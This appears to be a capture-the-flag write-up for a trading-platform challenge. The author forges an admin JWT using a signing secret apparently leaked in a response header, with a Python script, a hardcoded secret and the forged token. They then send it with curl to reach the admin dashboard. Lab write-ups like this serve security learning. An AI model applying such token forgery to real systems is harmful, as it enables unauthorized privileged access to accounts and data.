# URL
https://host5.metaproblems.com:7606/

# Concept
We were given a trading platform website where we had to login as admin to get the flag but we were only given user logins.
- Jwt manipulation

# Solve
On logging in as user, I inspected the cookies and noticing that we have a jwt token for the current user. I wrote a python script to
manipulate the user token into an admin token.
~~~python
import jwt
import time

# The secret from the 'jwt' header
secret = "jwt_z3bXPravDcYhjy5mhYgYLbWRoAPkPyn"

# Create payload for 'admin'
payload = {
    "sub": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 7200  # 2 hours from now
}

# Sign the token
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
~~~
After I used curl to send the token
~~~bash
curl -k -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTc2MTIyODA5NSwiZXhwIjoxNzYxMjM1Mjk1fQ.ZJUOMnUgQvYVZGB-X8ucKsq86Vf8U4KOTbCUPZ5QiTE" \
  https://host5.metaproblems.com:7606/dashboard
~~~
Another method was to replace the jwt token in the browser and get the flag.